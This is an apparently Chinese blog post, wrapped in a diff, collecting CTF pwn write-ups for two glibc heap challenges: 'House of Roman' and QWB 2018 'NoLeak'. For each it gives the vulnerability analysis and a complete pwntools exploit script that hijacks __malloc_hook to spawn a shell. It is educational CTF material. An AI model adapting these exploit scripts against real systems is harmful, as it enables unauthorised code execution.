@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="鹿桥">
+  <meta name="keyword" content="bin">
+  
+    <link rel="shortcut icon" type="image/ico" href="/css/images/logo.png"/>
+  
+  <title>
+    
+      一些pwn题解汇总.md | 鹿桥的博客
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>鹿桥的博客</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>一些pwn题解汇总.md</h2>
+  <p class="post-date">2020-01-03</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h3 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h3><h4 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h4><p>House of Roman<br>主要是利用了 &amp;main_arena+0x58 和一些 one_gadget 位置接近只要 partial write 就可以不需要 leak。</p>
+<ul>
+<li>UAF</li>
+<li>control size(any_size_malloc ||off by one || overflow)</li>
+<li>no leak</li>
+</ul>
+<p>mainly:<br>fast bin atk<br>unsorted bin atk<br>partial write</p>
+<p>从一个十分经典的题目看起<br><a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">题目附件</a></p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul>
+<li>Noleak</li>
+<li>malloc 任意大小chunk</li>
+<li>可以覆盖next_chunk_size<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0, heap_ptrs[v1], v2 + 1);</span><br></pre></td></tr></table></figure></li>
+<li>UAF<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v0 &lt;&#x3D; 19 )</span><br><span class="line">    free(heap_ptrs[v0]);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
+<li>fastbin atk to control malloc_hook</li>
+<li>unsorted bin to make malloc_hook=&amp;main_arena+0x58</li>
+<li>partial write malloc_hook to one_gadget</li>
+<li>use printerr to make esp+0x50=0 to get shell</li>
+</ul>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">"./new_chall"</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(str(sys.argv[<span class="number">1</span>]),<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b main"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"3. Free\n"</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter size of chunk :"</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter index :"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter index :"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter index of chunk :"</span>,str(idx))</span><br><span class="line">	p.sendafter(<span class="string">"Enter data :"</span>,c)</span><br><span class="line"></span><br><span class="line">p.readuntil(<span class="string">"Enter name :"</span>)</span><br><span class="line">p.sendline(<span class="string">"nier"</span>)</span><br><span class="line"><span class="comment">#fastbin atk to control __malloc_hook</span></span><br><span class="line">malloc(<span class="number">0x140</span>,<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">0x18</span>,<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="number">2</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">"\x00"</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"\xed\x1a"</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="number">6</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="number">7</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="number">8</span>)<span class="comment">#control malloc__hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fixfastbin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#unsorted bin to make malloc_hook=&amp;main_arena+0x58</span></span><br><span class="line">malloc(<span class="number">0x58</span>,<span class="number">10</span>)</span><br><span class="line">malloc(<span class="number">0x88</span>,<span class="number">11</span>)</span><br><span class="line">malloc(<span class="number">0x88</span>,<span class="number">12</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(<span class="number">0xdeadbeef</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">malloc(<span class="number">0x88</span>,<span class="number">13</span>)</span><br><span class="line"><span class="comment">#partial write malloc_hook to one_gadget</span></span><br><span class="line">edit(<span class="number">8</span>,p64(<span class="number">0xdeadbeefdeadbeef</span>)+<span class="string">"AAA"</span>+p64(<span class="number">0xdddddddddddddfdd</span>)+<span class="string">"\xa4\xd2\xaf"</span>)</span><br><span class="line"><span class="comment">#use printerr to make esp+0x50=0 to get shell</span></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	p.interactive(<span class="string">"&gt;"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	p.close()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Partial-write-NoLeak"><a href="#Partial-write-NoLeak" class="headerlink" title="Partial_write-NoLeak"></a>Partial_write-NoLeak</h3><p>这是强网杯 2018 的一道 pwn 题。<br>qctf2018-Noleak a challenge about partial write</p>
+<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>但是存在RWX 并且没开PIE</p>
+<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( cmd &lt;&#x3D; 9 )</span><br><span class="line">  free(buf[cmd]);</span><br></pre></td></tr></table></figure>
+<p>未将指针置为0且存放指针位置在bss</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idx &#x3D; buf[(unsigned int)idx];</span><br><span class="line">if ( idx )</span><br><span class="line">&#123;</span><br><span class="line">  putsn(&quot;Size: &quot;, 6u);</span><br><span class="line">  nbytes &#x3D; getn();</span><br><span class="line">  putsn(&quot;Data: &quot;, 6u);</span><br><span class="line">  LODWORD(idx) &#x3D; read(0, buf[v3], nbytes);  &#x2F;&#x2F; over flower</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>存在溢出</p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul>
+<li>通过上述两个漏洞可以做fast_bin_atk控制唯一已知位置:bss</li>
+<li>因为main_arenaq前面就是__malloc_hook</li>
+<li>free掉一个大于128bytes的chunk让其挂在unsorted bin上</li>
+<li>partial write 其fd使其指向__malloc_hook+5-0x10 (利用7f作为合法size位)</li>
+<li>shellcode可以利用之前留下的一个指针写入，并且改写指向malloc_hook+5的指针为malloc_hook</li>
+<li>利用指向__malloc_hook的指针写入shellcode的地址</li>
+<li>call malloc触发shellcode</li>
+</ul>
+<p>主要是 <code>partial_write</code> 写掉 <code>__malloc_hook</code></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">"./NoLeak"</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(str(sys.argv[<span class="number">1</span>]),<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b main"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice :"</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,c)</span>:</span>	</span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Size: "</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">"Data: "</span>,c.ljust(size,<span class="string">"\0"</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,c)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Size: "</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">"Data: "</span>,c.ljust(size,<span class="string">"\0"</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"AAAA"</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"BBBB"</span>)</span><br><span class="line">remove(<span class="number">1</span>)	</span><br><span class="line">payload=p64(<span class="number">0x601000</span><span class="number">-11</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"CCCC"</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)	</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'c'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'d'</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,<span class="string">'\xc0'</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x70</span>,<span class="number">0x68</span>*<span class="string">"A"</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'\x05'</span>)<span class="comment">#use 0x7f to build fake chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"B"</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"XXXX"</span>)</span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">sh=<span class="number">0x601005</span></span><br><span class="line">off=<span class="number">0x601078</span><span class="number">-0x601005</span></span><br><span class="line">shellcode=shellcode.ljust(off,<span class="string">"\0"</span>)+<span class="string">"\x10"</span></span><br><span class="line">edit(<span class="number">3</span>,len(shellcode),shellcode)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">8</span>,p64(sh))</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size: "</span>,<span class="string">"1"</span>)</span><br><span class="line">p.interactive(<span class="string">"&gt;"</span>)</span><br></pre></td></tr></table></figure></section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF_PWN" >
+    <span class="tag-code">CTF_PWN</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/11/17/hello-world/">
+        <span class="nav-arrow">← </span>
+        
+          Hello World
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/01/13/dex-file-structure/">
+        
+          dex文件结构
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>请作者喝咖啡</b>
+            </span>
+          </span>
+        </div>
+        <!-- <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p> -->
+        <p class="notice"> <b>读后有收获可以使用微信支付请作者喝咖啡:) </b></p>
+
+        
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- No Comment -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#House-of-Roman"><span class="toc-nav-text">House of Roman</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#前置"><span class="toc-nav-text">前置</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#分析"><span class="toc-nav-text">分析</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#利用思路"><span class="toc-nav-text">利用思路</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#EXP"><span class="toc-nav-text">EXP</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Partial-write-NoLeak"><span class="toc-nav-text">Partial_write-NoLeak</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#分析-1"><span class="toc-nav-text">分析</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#漏洞点"><span class="toc-nav-text">漏洞点</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#思路"><span class="toc-nav-text">思路</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#exp"><span class="toc-nav-text">exp</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://yoursite.com/2020/01/03/some-ctf-pwn-solve/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2023 | 鹿桥 </a>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">
+    总访问量<span id="busuanzi_value_site_pv"></span>次
+    </span>
+    <span id="busuanzi_container_page_pv">
+    本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>    
+
+    <!-- <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a> -->
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </body>
+</html>
